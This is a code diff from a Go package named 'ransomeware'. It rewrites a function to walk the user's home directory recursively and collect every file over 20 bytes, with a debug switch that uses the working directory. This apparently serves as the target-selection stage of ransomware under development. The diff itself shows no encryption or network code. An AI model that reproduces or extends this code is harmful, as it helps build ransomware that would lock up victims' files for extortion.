@@ -2,50 +2,40 @@ package ransomeware
 
 import (
 	"fmt"
-	"io/fs"
-	"io/ioutil"
 	"log"
 	"os"
+	"path/filepath"
 )
 
 func GetAllFiles() {
-	var files []fs.FileInfo
+	DEBUG := true
 	homeDir, err := os.UserHomeDir()
 	if err != nil {
 		log.Fatal(err)
 	}
-	homefiles, err := ioutil.ReadDir(homeDir)
+	if DEBUG {
+		homeDir, err = os.Getwd()
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+	fmt.Println(homeDir)
+	var files []string
+	err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
+		if !info.IsDir() && info.Size() > 20 {
+			files = append(files, path)
+
+			fmt.Println(path)
+		}
+		return nil
+	})
 	if err != nil {
 		log.Fatal(err)
 	}
-	var extractAllFiles func(fs.FileInfo)
-	extractAllFiles = func(file fs.FileInfo) {
-		if file.IsDir() && file.Size() > 10 {
-			fls, err := ioutil.ReadDir(file.Name())
-			if err != nil {
-				log.Fatal(err)
-			}
-			for _, f := range fls {
-				extractAllFiles(f)
-			}
-		} else {
-			if !ContainsFile(files, file) {
-				files = append(files, file)
-			}
-		}
-	}
-	for _, file := range homefiles {
-		extractAllFiles(file)
-		fmt.Println(file.Name())
+	for _, file := range files {
+		fmt.Println(file)
 	}
 
-}
+	//return files, err
 
-func ContainsFile(files []fs.FileInfo, file fs.FileInfo) bool {
-	for _, f := range files {
-		if f == file {
-			return true
-		}
-	}
-	return false
 }
